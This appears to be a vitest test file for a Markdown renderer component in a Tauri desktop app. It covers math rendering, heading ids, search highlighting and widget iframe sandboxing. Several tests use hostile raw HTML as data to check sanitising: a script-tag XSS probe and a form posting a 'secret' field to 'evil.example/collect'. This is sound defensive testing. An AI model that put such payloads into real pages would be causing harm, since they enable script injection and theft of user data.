import { act, fireEvent, render, screen } from "@testing-library/react";
import { openUrl } from "@tauri-apps/plugin-opener";
import { invoke } from "@tauri-apps/api/core";
import { MarkdownDocument } from "./MarkdownDocument";
import { extractOutline } from "../lib/outline";
import { widgetRegistry } from "../lib/widgetRegistry";
import { useState } from "react";
import { beforeEach, describe, expect, it, vi } from "vitest";

vi.mock("@tauri-apps/plugin-opener", () => ({
  openUrl: vi.fn(),
}));

vi.mock("@tauri-apps/api/core", () => ({
  invoke: vi.fn(),
}));

beforeEach(() => {
  vi.mocked(openUrl).mockClear();
  vi.mocked(invoke).mockReset();
  vi.mocked(invoke).mockResolvedValue({
    id: "w-stable",
    url: "http://vellum-widget.localhost/w-stable",
  });
});

describe("MarkdownDocument", () => {
  it("renders headings, lists, tables, quotes, and code", async () => {
    const markdown = [
      "# Title",
      "",
      "> Quote",
      "",
      "- item",
      "",
      "| A | B |",
      "| - | - |",
      "| 1 | 2 |",
      "",
      "```ts",
      "const value = 1;",
      "```",
    ].join("\n");

    render(<MarkdownDocument markdown={markdown} />);
    // 让按需加载的高亮语言包在 act 内完成，避免 act(...) 警告
    await act(async () => {});

    expect(screen.getByRole("heading", { name: "Title" })).toBeInTheDocument();
    expect(screen.getByText("Quote")).toBeInTheDocument();
    expect(screen.getByText("item")).toBeInTheDocument();
    expect(screen.getByRole("table")).toBeInTheDocument();
    const codeBlock = screen.getByRole("code");
    expect(codeBlock).toHaveTextContent("const value = 1;");
  });

  it("does not render script tags from Markdown", () => {
    const markdown = ["Safe", "", '<script>alert("x")</script>'].join("\n");
    render(<MarkdownDocument markdown={markdown} />);

    expect(screen.queryByText('alert("x")')).not.toBeInTheDocument();
    expect(screen.getByText("Safe")).toBeInTheDocument();
  });

  it("preserves safe raw HTML such as divs and tables", () => {
    const markdown = [
      '<div align="center">Centered</div>',
      "",
      "<table><tr><td>cell</td></tr></table>",
    ].join("\n");

    render(<MarkdownDocument markdown={markdown} />);

    expect(screen.getByText("Centered")).toBeInTheDocument();
    expect(screen.getByText("cell")).toBeInTheDocument();
  });

  it("renders inline and display math with KaTeX", () => {
    const markdown = [
      "输入向量 $\\mathbf{z}=(z_1,\\dots,z_n)$ 后解码。",
      "",
      "$$",
      "\\int_0^1 x^2 \\, dx = \\frac{1}{3}",
      "$$",
    ].join("\n");

    const { container } = render(<MarkdownDocument markdown={markdown} />);

    // 行内公式渲染为 .katex，$ 定界符不残留在文本里
    const inline = container.querySelector("p .katex");
    expect(inline).toBeInTheDocument();
    expect(inline).toHaveTextContent("z");
    expect(container.querySelector("p")).not.toHaveTextContent("$");
    // 块级公式
    expect(container.querySelector(".katex-display")).toBeInTheDocument();
  });

  it("renders ```math fenced blocks as display math", () => {
    const markdown = ["```math", "E = mc^2", "```"].join("\n");

    const { container } = render(<MarkdownDocument markdown={markdown} />);

    expect(container.querySelector(".katex-display")).toBeInTheDocument();
    expect(container.querySelector(".code-block")).not.toBeInTheDocument();
  });

  it("does not treat currency-style dollar signs as math", () => {
    const { container } = render(
      <MarkdownDocument markdown="价格在 $5 和 $10 之间" />,
    );

    expect(container.querySelector(".katex")).not.toBeInTheDocument();
    expect(screen.getByText(/价格在/)).toHaveTextContent("价格在 $5 和 $10 之间");
  });

  it("renders invalid math as an inline error without failing the document", () => {
    const { container } = render(
      <MarkdownDocument markdown={"$\\notacommand$ 后面的内容"} />,
    );

    // KaTeX 把未定义命令以红色源码内联展示（不抛错），其余内容正常渲染
    expect(container.querySelector(".katex")).toBeInTheDocument();
    expect(container.querySelector("p")).toHaveTextContent("\\notacommand");
    expect(screen.getByText(/后面的内容/)).toBeInTheDocument();
  });

  it("assigns outline ids to headings containing math", () => {
    // 大纲文本来自源文档（含 $ 定界符），渲染文本是公式字形，两者必然不匹配，
    // 走「同级含 $ 未使用标题按序分配」兑底
    const { container } = render(
      <MarkdownDocument
        markdown={["## 前置", "", "## $O(n)$ 复杂度", "", "## 后续"].join("\n")}
        headings={[
          { id: "qianzhi", level: 2, text: "前置" },
          { id: "on-fuzadu", level: 2, text: "$O(n)$ 复杂度" },
          { id: "houxu", level: 2, text: "后续" },
        ]}
      />
    );

    // 直接比对 id 序列（KaTeX 内联样式会让 jsdom 的 accessible-name 计算崩溃，不用 getByRole name）
    const rendered = Array.from(container.querySelectorAll("h2"));
    expect(rendered.map((h) => h.id)).toEqual(["qianzhi", "on-fuzadu", "houxu"]);
    expect(rendered[1].querySelector(".katex")).toBeInTheDocument();
  });

  it("keeps real math while leaving currency text literal", () => {
    const markdown = "设 $x$ 为价格，区间 $5 到 $10 之间。";

    const { container } = render(<MarkdownDocument markdown={markdown} />);

    const katexNodes = container.querySelectorAll(".katex");
    expect(katexNodes).toHaveLength(1);
    expect(katexNodes[0]).toHaveTextContent("x");
    expect(container.querySelector("p")).toHaveTextContent("$5 到 $10");
  });

  it("renders heading ids from the outline", () => {
    render(
      <MarkdownDocument
        markdown={["# Title", "", "## Section"].join("\n")}
        headings={[
          { id: "title", level: 1, text: "Title" },
          { id: "section", level: 2, text: "Section" },
        ]}
      />
    );

    expect(screen.getByRole("heading", { name: "Title" })).toHaveAttribute("id", "title");
    expect(screen.getByRole("heading", { name: "Section" })).toHaveAttribute("id", "section");
  });

  it("handles duplicate heading text with unique ids from the outline", () => {
    render(
      <MarkdownDocument
        markdown={["# Title", "", "# Title", "", "# Title"].join("\n")}
        headings={[
          { id: "title", level: 1, text: "Title" },
          { id: "title-1", level: 1, text: "Title" },
          { id: "title-2", level: 1, text: "Title" },
        ]}
      />
    );

    const headings = screen.getAllByRole("heading", { name: "Title" });
    expect(headings).toHaveLength(3);
    expect(headings[0]).toHaveAttribute("id", "title");
    expect(headings[1]).toHaveAttribute("id", "title-1");
    expect(headings[2]).toHaveAttribute("id", "title-2");
  });

  it("resets heading id allocation when document or headings change", () => {
    const { rerender } = render(
      <MarkdownDocument
        markdown="# Title"
        headings={[{ id: "first-title", level: 1, text: "Title" }]}
      />
    );

    expect(screen.getByRole("heading", { name: "Title" })).toHaveAttribute("id", "first-title");

    rerender(
      <MarkdownDocument
        markdown="# Title"
        headings={[{ id: "second-title", level: 1, text: "Title" }]}
      />
    );

    expect(screen.getByRole("heading", { name: "Title" })).toHaveAttribute("id", "second-title");
  });

  it("keeps stable heading ids stable across re-renders with the same headings", () => {
    const { rerender } = render(
      <MarkdownDocument
        markdown="# Title"
        headings={[{ id: "keep", level: 1, text: "Title" }]}
      />
    );

    expect(screen.getByRole("heading", { name: "Title" })).toHaveAttribute("id", "keep");

    rerender(
      <MarkdownDocument
        markdown="# Title"
        headings={[{ id: "keep", level: 1, text: "Title" }]}
      />
    );

    expect(screen.getByRole("heading", { name: "Title" })).toHaveAttribute("id", "keep");
  });

  it("generates unique fallback ids when no headings prop is provided", () => {
    render(<MarkdownDocument markdown={["# Same", "", "# Same"].join("\n")} />);

    const headings = screen.getAllByRole("heading", { name: "Same" });
    expect(headings).toHaveLength(2);
    expect(headings[0]).toHaveAttribute("id", "same");
    expect(headings[1]).toHaveAttribute("id", "same-1");
  });

  it("generates unique fallback ids for duplicate rich-text headings", () => {
    render(<MarkdownDocument markdown={["# **Same**", "", "# **Same**"].join("\n")} />);

    const headings = screen.getAllByRole("heading", { name: "Same" });
    expect(headings).toHaveLength(2);
    expect(headings[0]).toHaveAttribute("id", "same");
    expect(headings[1]).toHaveAttribute("id", "same-1");
  });

  it("matches heading ids generated by extractOutline", () => {
    const markdown = ["# A \u0026eacute; B", "", "## **Same**"].join("\n");
    const headings = extractOutline(markdown);
    render(<MarkdownDocument markdown={markdown} headings={headings} />);

    expect(screen.getByRole("heading", { name: "A é B" })).toHaveAttribute("id", headings[0].id);
    expect(screen.getByRole("heading", { name: "Same" })).toHaveAttribute("id", headings[1].id);
  });

  it("renders inline code without a copy button", () => {
    render(<MarkdownDocument markdown="Use `inlineCode` here." />);
    expect(screen.getByRole("code")).toHaveTextContent("inlineCode");
    expect(screen.queryByRole("button", { name: "复制" })).not.toBeInTheDocument();
  });

  it("renders a copyable code block for fenced code with language", async () => {
    vi.stubGlobal("navigator", { clipboard: { writeText: vi.fn().mockResolvedValueOnce(undefined) } });
    render(<MarkdownDocument markdown="```ts
const x = 1;
```" />);
    expect(screen.getByText("ts")).toBeInTheDocument();
    await act(async () => {
      fireEvent.click(screen.getByRole("button", { name: "复制" }));
    });
    expect(navigator.clipboard.writeText).toHaveBeenCalledWith("const x = 1;");
    vi.unstubAllGlobals();
  });

  it("renders a copyable code block for fenced code without language", async () => {
    vi.stubGlobal("navigator", { clipboard: { writeText: vi.fn().mockResolvedValueOnce(undefined) } });
    render(<MarkdownDocument markdown="```
plain block
```" />);
    expect(screen.getByRole("button", { name: "复制" })).toBeInTheDocument();
    expect(screen.queryByText("plain")).not.toBeInTheDocument();
    await act(async () => {
      fireEvent.click(screen.getByRole("button", { name: "复制" }));
    });
    expect(navigator.clipboard.writeText).toHaveBeenCalledWith("plain block");
    vi.unstubAllGlobals();
  });

  it("renders copy controls for sanitized raw HTML pre > code", async () => {
    vi.stubGlobal("navigator", { clipboard: { writeText: vi.fn().mockResolvedValueOnce(undefined) } });
    render(<MarkdownDocument markdown="<pre><code>raw html</code></pre>" />);
    expect(screen.getByRole("button", { name: "复制" })).toBeInTheDocument();
    await act(async () => {
      fireEvent.click(screen.getByRole("button", { name: "复制" }));
    });
    expect(navigator.clipboard.writeText).toHaveBeenCalledWith("raw html");
    vi.unstubAllGlobals();
  });

  it("preserves nested safe raw HTML inside pre > code for display and clipboard", async () => {
    vi.stubGlobal("navigator", { clipboard: { writeText: vi.fn().mockResolvedValueOnce(undefined) } });
    render(<MarkdownDocument markdown="<pre><code>raw <span>html</span></code></pre>" />);

    expect(screen.getByRole("code")).toHaveTextContent("raw html");
    await act(async () => {
      fireEvent.click(screen.getByRole("button", { name: "复制" }));
    });
    expect(navigator.clipboard.writeText).toHaveBeenCalledWith("raw html");
    vi.unstubAllGlobals();
  });

  it("strips form elements from raw HTML", () => {
    const markdown = [
      '<form action="https://evil.example/collect" method="post">',
      '<button type="submit">提交</button>',
      '<textarea name="secret">secret</textarea>',
      '<select name="choice"><option value="1">one</option></select>',
      '<label for="x">标签</label>',
      "</form>",
    ].join("\n");

    const { container } = render(<MarkdownDocument markdown={markdown} />);

    expect(container.querySelector("form")).not.toBeInTheDocument();
    expect(container.querySelector("button")).not.toBeInTheDocument();
    expect(container.querySelector("textarea")).not.toBeInTheDocument();
    expect(container.querySelector("select")).not.toBeInTheDocument();
    expect(container.querySelector("option")).not.toBeInTheDocument();
    expect(container.querySelector("label")).not.toBeInTheDocument();
    expect(container.querySelector("[action]")).not.toBeInTheDocument();
  });

  it("keeps GFM task list checkboxes", () => {
    const { container } = render(<MarkdownDocument markdown={["- [ ] 待办", "- [x] 完成"].join("\n")} />);

    expect(container.querySelectorAll('input[type="checkbox"]')).toHaveLength(2);
  });

  it("opens mailto links with the system opener instead of the webview", () => {
    render(<MarkdownDocument markdown="[写信](mailto:a@example.com)" />);

    fireEvent.click(screen.getByRole("link", { name: "写信" }));

    expect(openUrl).toHaveBeenCalledWith("mailto:a@example.com");
  });

  it("opens ftp links with the system opener instead of the webview", () => {
    render(<MarkdownDocument markdown="[文件](ftp://example.com/a.zip)" />);

    fireEvent.click(screen.getByRole("link", { name: "文件" }));

    expect(openUrl).toHaveBeenCalledWith("ftp://example.com/a.zip");
  });

  it("keeps in-page anchors as plain links", () => {
    render(<MarkdownDocument markdown="[跳转](#section)" />);

    const link = screen.getByRole("link", { name: "跳转" });
    fireEvent.click(link);

    expect(openUrl).not.toHaveBeenCalled();
    expect(link).toHaveAttribute("href", "#section");
  });

  it("passes the image title through to the img element", () => {
    render(<MarkdownDocument markdown={'![alt](https://example.com/a.png "示意图")'} />);

    expect(screen.getByRole("img", { name: "alt" })).toHaveAttribute("title", "示意图");
  });

  it("does not leak the node prop onto inline code elements", () => {
    const { container } = render(<MarkdownDocument markdown="Use `inlineCode` here." />);

    expect(container.querySelector("code")).not.toHaveAttribute("node");
  });

  it("highlights searches declaratively across query changes and resets", () => {
    const onMatchCountChange = vi.fn();
    // mock 出「匹配项在视口下方 500px」的位置差，让搜索跳转真正启动 rAF 缓动动画
    vi.spyOn(HTMLElement.prototype, "getBoundingClientRect").mockImplementation(function (this: HTMLElement) {
      const top = this.classList.contains("document-scroll") ? 0 : 500;
      return { top, bottom: top + 20, height: 20 } as DOMRect;
    });
    const raf = vi.spyOn(window, "requestAnimationFrame");

    const { container, rerender } = render(
      <div className="document-scroll">
        <MarkdownDocument
          markdown="Alpha alpha beta"
          searchQuery="ALPHA"
          activeMatchIndex={1}
          onMatchCountChange={onMatchCountChange}
        />
      </div>
    );

    let marks = container.querySelectorAll("mark.search-match");
    expect(marks).toHaveLength(2);
    expect(marks[0]).toHaveTextContent("Alpha");
    expect(marks[1]).toHaveClass("search-match--current");
    expect(onMatchCountChange).toHaveBeenLastCalledWith(2);
    // 搜索跳转应启动 rAF 缓动动画（而非原生 scrollIntoView）
    expect(raf).toHaveBeenCalled();

    rerender(
      <div className="document-scroll">
        <MarkdownDocument
          markdown="Alpha alpha beta"
          searchQuery="beta"
          activeMatchIndex={0}
          onMatchCountChange={onMatchCountChange}
        />
      </div>
    );
    marks = container.querySelectorAll("mark.search-match");
    expect(marks).toHaveLength(1);
    expect(marks[0]).toHaveTextContent("beta");
    expect(marks[0]).toHaveClass("search-match--current");

    rerender(
      <MarkdownDocument
        markdown="Alpha alpha beta"
        searchQuery=""
        activeMatchIndex={0}
        onMatchCountChange={onMatchCountChange}
      />
    );
    expect(container.querySelectorAll("mark.search-match")).toHaveLength(0);
    expect(onMatchCountChange).toHaveBeenLastCalledWith(0);

    rerender(
      <MarkdownDocument
        markdown="Alpha alpha beta"
        searchQuery="alpha"
        activeMatchIndex={0}
        onMatchCountChange={onMatchCountChange}
      />
    );
    expect(container.querySelectorAll("mark.search-match")).toHaveLength(2);
  });

  it("debounces scroll while deleting and resets the timer on each keystroke", () => {
    vi.useFakeTimers();
    try {
      // mock 出「匹配项在视口下方 500px」的位置差，滚动若触发一定会调 rAF
      vi.spyOn(HTMLElement.prototype, "getBoundingClientRect").mockImplementation(function (this: HTMLElement) {
        const top = this.classList.contains("document-scroll") ? 0 : 500;
        return { top, bottom: top + 20, height: 20 } as DOMRect;
      });
      const raf = vi.spyOn(window, "requestAnimationFrame");

      const { rerender } = render(
        <div className="document-scroll">
          <MarkdownDocument markdown="Alpha alpha beta" searchQuery="alpha" activeMatchIndex={0} />
        </div>
      );
      // 输入（变长）保持立即滚动
      expect(raf).toHaveBeenCalled();
      raf.mockClear();

      // 删除一个字符：不立即滚动
      rerender(
        <div className="document-scroll">
          <MarkdownDocument markdown="Alpha alpha beta" searchQuery="alph" activeMatchIndex={0} />
        </div>
      );
      expect(raf).not.toHaveBeenCalled();

      // 300ms 内继续删除：上一个定时器被取消重排
      rerender(
        <div className="document-scroll">
          <MarkdownDocument markdown="Alpha alpha beta" searchQuery="alp" activeMatchIndex={0} />
        </div>
      );
      act(() => {
        vi.advanceTimersByTime(299);
      });
      expect(raf).not.toHaveBeenCalled();

      // 停手满 300ms：以最终关键词滚动一次
      act(() => {
        vi.advanceTimersByTime(1);
      });
      expect(raf).toHaveBeenCalled();
    } finally {
      vi.useRealTimers();
    }
  });

  it("does not scroll on the urgent render while the deleted query is still pending", () => {
    vi.useFakeTimers();
    try {
      // mock 出「匹配项在视口下方 500px」的位置差，滚动若触发一定会调 rAF
      vi.spyOn(HTMLElement.prototype, "getBoundingClientRect").mockImplementation(function (this: HTMLElement) {
        const top = this.classList.contains("document-scroll") ? 0 : 500;
        return { top, bottom: top + 20, height: 20 } as DOMRect;
      });
      const raf = vi.spyOn(window, "requestAnimationFrame");

      const { rerender } = render(
        <div className="document-scroll">
          <MarkdownDocument markdown="Alpha alpha beta" searchQuery="alpha" activeMatchIndex={1} />
        </div>
      );
      // 导航到第 2 个匹配：立即滚动
      expect(raf).toHaveBeenCalled();
      raf.mockClear();

      // urgent 渲染：deferred 词未跟进（query 未变）、索引被重置为 0、pending=true
      // —— 索引重置只是输入的副产物，不得滚动（否则删除时页面秒跳到旧词首个匹配）
      rerender(
        <div className="document-scroll">
          <MarkdownDocument
            markdown="Alpha alpha beta"
            searchQuery="alpha"
            searchQueryPending
            activeMatchIndex={0}
          />
        </div>
      );
      expect(raf).not.toHaveBeenCalled();

      // deferred 提交：新词是「纯删除」结果 → 进入 300ms 防抖，仍不立即滚动
      rerender(
        <div className="document-scroll">
          <MarkdownDocument
            markdown="Alpha alpha beta"
            searchQuery="alph"
            searchQueryPending={false}
            activeMatchIndex={0}
          />
        </div>
      );
      expect(raf).not.toHaveBeenCalled();

      // 停手满 300ms：以最终关键词滚动一次
      act(() => {
        vi.advanceTimersByTime(300);
      });
      expect(raf).toHaveBeenCalled();
    } finally {
      vi.useRealTimers();
    }
  });

  it("skips the debounced scroll when the first match is already in the viewport", () => {
    vi.useFakeTimers();
    try {
      // 容器高 600px，匹配项在 top=100，已完整落在视口内
      vi.spyOn(HTMLElement.prototype, "getBoundingClientRect").mockImplementation(function (this: HTMLElement) {
        const inContainer = this.classList.contains("document-scroll");
        const top = inContainer ? 0 : 100;
        const height = inContainer ? 600 : 20;
        return { top, bottom: top + height, height } as DOMRect;
      });
      const raf = vi.spyOn(window, "requestAnimationFrame");

      const { rerender } = render(
        <div className="document-scroll">
          <MarkdownDocument markdown="Alpha alpha beta" searchQuery="alpha" activeMatchIndex={0} />
        </div>
      );
      expect(raf).toHaveBeenCalled();
      raf.mockClear();

      rerender(
        <div className="document-scroll">
          <MarkdownDocument markdown="Alpha alpha beta" searchQuery="alph" activeMatchIndex={0} />
        </div>
      );
      act(() => {
        vi.advanceTimersByTime(300);
      });
      // 延迟触发时首个匹配已在视口内：只留高亮，不滚动
      expect(raf).not.toHaveBeenCalled();
    } finally {
      vi.useRealTimers();
    }
  });

  it("supports markdown updates, parent count state updates, and unmount while searching", () => {
    function SearchHarness() {
      const [count, setCount] = useState(-1);
      const [markdown, setMarkdown] = useState("one");
      return (
        <>
          <span data-testid="match-count">{count}</span>
          <button type="button" onClick={() => setMarkdown("one one")}>update</button>
          <MarkdownDocument
            markdown={markdown}
            searchQuery="one"
            activeMatchIndex={0}
            onMatchCountChange={setCount}
          />
        </>
      );
    }

    const { container, unmount } = render(<SearchHarness />);
    expect(screen.getByTestId("match-count")).toHaveTextContent("1");
    expect(container.querySelectorAll("mark.search-match")).toHaveLength(1);

    fireEvent.click(screen.getByRole("button", { name: "update" }));
    expect(screen.getByTestId("match-count")).toHaveTextContent("2");
    expect(container.querySelectorAll("mark.search-match")).toHaveLength(2);
    expect(() => unmount()).not.toThrow();
  });

  it("skips inline and fenced code subtrees when highlighting", () => {
    const { container } = render(
      <MarkdownDocument
        markdown={["term", "", "`term`", "", "```txt", "term", "```"].join("\n")}
        searchQuery="term"
        activeMatchIndex={0}
      />
    );

    expect(container.querySelectorAll("mark.search-match")).toHaveLength(1);
    expect(container.querySelector("code mark")).not.toBeInTheDocument();
  });

  it("extracts hyphenated language names like objective-c without truncation", async () => {
    const markdown = [
      "```objective-c",
      'NSLog(@"Hello");',
      "```",
    ].join("\n");

    render(<MarkdownDocument markdown={markdown} />);
    await act(async () => {});

    expect(screen.getByText("objective-c")).toBeInTheDocument();
  });

  it("renders vellum-widget with autoMount=true for trusted mdlog documents", async () => {
    const markdown = [
      "<!-- mdlog:v1 s=123 -->",
      "",
      "# Pi 对话记录",
      "",
      "```vellum-widget",
      "<div>interactive content</div>",
      "```",
    ].join("\n");

    const { container } = render(<MarkdownDocument markdown={markdown} />);
    await act(async () => {});

    expect(container.querySelector(".mdlog-widget")).toBeInTheDocument();
    expect(screen.queryByText("交互内容 · 点击加载")).not.toBeInTheDocument();
  });

  it("renders vellum-widget with autoMount=false for untrusted documents", async () => {
    const markdown = [
      "# Regular Document",
      "",
      "```vellum-widget",
      "<div>untrusted interactive</div>",
      "```",
    ].join("\n");

    render(<MarkdownDocument markdown={markdown} />);
    await act(async () => {});

    expect(screen.getByText("交互内容 · 点击加载")).toBeInTheDocument();
  });

  it("intercepts vellum-widget exceeding 512KB and downgrades to CodeBlock", async () => {
    const oversizedCode = "x".repeat(524289);
    const markdown = [
      "<!-- mdlog:v1 s=123 -->",
      "",
      "```vellum-widget",
      oversizedCode,
      "```",
    ].join("\n");

    const { container } = render(<MarkdownDocument markdown={markdown} />);
    await act(async () => {});

    // 超过 512KB 降级为普通 CodeBlock，不进入 WidgetSandbox
    expect(container.querySelector(".mdlog-widget")).not.toBeInTheDocument();
    expect(container.querySelector(".code-block")).toBeInTheDocument();
  });

  it("preserves components memo and iframe DOM instance across markdown appends", async () => {
    vi.spyOn(globalThis, "IntersectionObserver").mockImplementation(function (
      this: unknown,
      callback: IntersectionObserverCallback
    ) {
      return {
        observe: vi.fn(() => {
          callback(
            [{ isIntersecting: true } as IntersectionObserverEntry],
            {} as IntersectionObserver
          );
        }),
        unobserve: vi.fn(),
        disconnect: vi.fn(),
        takeRecords: vi.fn(() => []),
        root: null,
        rootMargin: "200px",
        thresholds: [0],
      } as unknown as IntersectionObserver;
    });

    const initialMarkdown = [
      "<!-- mdlog:v1 s=123 -->",
      "",
      "# Section 1",
      "",
      "```vellum-widget",
      "<div>stable iframe</div>",
      "```",
    ].join("\n");

    // 生产接线：像 App.tsx:498 一样向 MarkdownDocument 传入根据 markdown 提取的大纲数组
    const initialHeadings = extractOutline(initialMarkdown);

    const { container, rerender } = render(
      <MarkdownDocument markdown={initialMarkdown} headings={initialHeadings} />
    );
    await act(async () => {});

    const initialWidget = container.querySelector(".mdlog-widget");
    const initialIframe = container.querySelector("iframe");
    expect(initialWidget).toBeInTheDocument();
    expect(initialIframe).toBeInTheDocument();
    expect(invoke).toHaveBeenCalledTimes(1);

    // 模拟追加一条新消息（热重载更新 markdown 并产生新的 headings 引用）
    const appendedMarkdown = [
      initialMarkdown,
      "",
      "新消息追加内容",
    ].join("\n");
    const appendedHeadings = extractOutline(appendedMarkdown);

    rerender(
      <MarkdownDocument markdown={appendedMarkdown} headings={appendedHeadings} />
    );
    await act(async () => {});

    const rerenderedWidget = container.querySelector(".mdlog-widget");
    const rerenderedIframe = container.querySelector("iframe");
    expect(rerenderedWidget).toBeInTheDocument();
    expect(rerenderedIframe).toBeInTheDocument();

    // 生产接线级断言：追加内容前后已存在的 widget DOM 容器与 iframe 必须严格为同一实例，且 register_widget 仅调 1 次
    expect(rerenderedWidget).toBe(initialWidget);
    expect(rerenderedIframe).toBe(initialIframe);
    expect(invoke).toHaveBeenCalledTimes(1);
  });

  it("P2 防线：非受信文档 X 点击授权后切非受信文档 Y，Y 必须显示占位块且 register 不新增", async () => {
    vi.spyOn(globalThis, "IntersectionObserver").mockImplementation(function (
      this: unknown,
      callback: IntersectionObserverCallback
    ) {
      return {
        observe: vi.fn(() => {
          callback(
            [{ isIntersecting: true } as IntersectionObserverEntry],
            {} as IntersectionObserver
          );
        }),
        unobserve: vi.fn(),
        disconnect: vi.fn(),
        takeRecords: vi.fn(() => []),
        root: null,
        rootMargin: "200px",
        thresholds: [0],
      } as unknown as IntersectionObserver;
    });

    vi.mocked(invoke).mockImplementation(async (cmd) => {
      if (cmd === "register_widget") {
        return {
          id: "widget-x-id",
          url: "http://vellum-widget.localhost/widget-x-id",
        };
      }
      return null;
    });

    // 1. 非受信文档 X（无 <!-- mdlog:v1 --> 头）
    const docX = [
      "# Doc X",
      "",
      "```vellum-widget",
      "<div>content of X</div>",
      "```",
    ].join("\n");
    const headingsX = extractOutline(docX);

    const { container, rerender } = render(
      <MarkdownDocument markdown={docX} headings={headingsX} />
    );
    await act(async () => {});

    // 初始必须为占位块，未发生 register
    const placeholderX = screen.getByText("交互内容 · 点击加载");
    expect(placeholderX).toBeInTheDocument();
    expect(invoke).not.toHaveBeenCalledWith("register_widget", expect.anything());

    // 用户主动点击授权挂载 X
    await act(async () => {
      fireEvent.click(placeholderX);
    });
    expect(invoke).toHaveBeenCalledWith("register_widget", { html: "<div>content of X</div>" });
    expect(container.querySelector("iframe")).toBeInTheDocument();
    const registerCallsBeforeSwitch = vi.mocked(invoke).mock.calls.filter(
      (call) => call[0] === "register_widget"
    ).length;
    expect(registerCallsBeforeSwitch).toBe(1);

    // 2. 切换到另一篇非受信文档 Y（同结构，不同 widget 内容）
    const docY = [
      "# Doc Y",
      "",
      "```vellum-widget",
      "<div>content of Y</div>",
      "```",
    ].join("\n");
    const headingsY = extractOutline(docY);

    rerender(<MarkdownDocument markdown={docY} headings={headingsY} />);
    await act(async () => {});

    // P2 防线断言：Y 绝不能免点击自动挂载，必须显示占位块且 register 不新增
    expect(screen.getByText("交互内容 · 点击加载")).toBeInTheDocument();
    expect(container.querySelector("iframe")).not.toBeInTheDocument();
    const registerCallsAfterSwitch = vi.mocked(invoke).mock.calls.filter(
      (call) => call[0] === "register_widget"
    ).length;
    expect(registerCallsAfterSwitch).toBe(1);
    expect(invoke).toHaveBeenCalledWith("unregister_widget", { id: "widget-x-id" });
  });

  it("P4 防线：休眠导致 unregister 并在唤醒后重新 register 新 URL", async () => {
    vi.useFakeTimers();
    try {
      if ("__clear" in widgetRegistry && typeof widgetRegistry.__clear === "function") {
        widgetRegistry.__clear();
      }

      vi.spyOn(globalThis, "IntersectionObserver").mockImplementation(function (
        this: unknown,
        callback: IntersectionObserverCallback
      ) {
        return {
          observe: vi.fn(() => {
            callback(
              [{ isIntersecting: true } as IntersectionObserverEntry],
              {} as IntersectionObserver
            );
          }),
          unobserve: vi.fn(),
          disconnect: vi.fn(),
          takeRecords: vi.fn(() => []),
          root: null,
          rootMargin: "200px",
          thresholds: [0],
        } as unknown as IntersectionObserver;
      });

      let registerCallsCount = 0;
      vi.mocked(invoke).mockImplementation(async (cmd) => {
        if (cmd === "register_widget") {
          return registerCallsCount++ === 0
            ? { id: "w-md-1", url: "http://vellum-widget.localhost/w-md-1" }
            : { id: "w-md-2", url: "http://vellum-widget.localhost/w-md-2" };
        }
        return null;
      });

      const md = [
        "<!-- mdlog:v1 s=123 -->",
        "",
        "# Live Section",
        "",
        "```vellum-widget",
        "<div>dormant md doc</div>",
        "```",
      ].join("\n");
      const headings = extractOutline(md);

      const { container } = render(<MarkdownDocument markdown={md} headings={headings} />);
      await act(async () => {});

      const initialIframe = container.querySelector("iframe");
      expect(initialIframe).toBeInTheDocument();
      expect(initialIframe?.src).toBe("http://vellum-widget.localhost/w-md-1");

      // 模拟全局 LRU 淘汰导致其休眠
      act(() => {
        for (let i = 1; i <= 11; i++) {
          widgetRegistry.register(`other-${i}`);
          widgetRegistry.requestMount(`other-${i}`);
          widgetRegistry.markVisible(`other-${i}`);
        }
        vi.advanceTimersByTime(400);
      });

      // P4 断言：进入休眠时必须调用 unregister_widget，且 iframe 必须销毁
      expect(invoke).toHaveBeenCalledWith("unregister_widget", { id: "w-md-1" });
      const dormantBtn = screen.getByText("交互已休眠 · 点击查看");
      expect(dormantBtn).toBeInTheDocument();
      expect(container.querySelector("iframe")).not.toBeInTheDocument();

      // 用户点击唤醒
      await act(async () => {
        fireEvent.click(dormantBtn);
      });

      // 断言重新向后端 register_widget 获得新 URL
      const registerCalls = vi.mocked(invoke).mock.calls.filter(
        (call) => call[0] === "register_widget"
      );
      expect(registerCalls.length).toBe(2);
      const reactivatedIframe = container.querySelector("iframe");
      expect(reactivatedIframe).toBeInTheDocument();
      expect(reactivatedIframe?.src).toBe("http://vellum-widget.localhost/w-md-2");
    } finally {
      vi.useRealTimers();
    }
  });
});
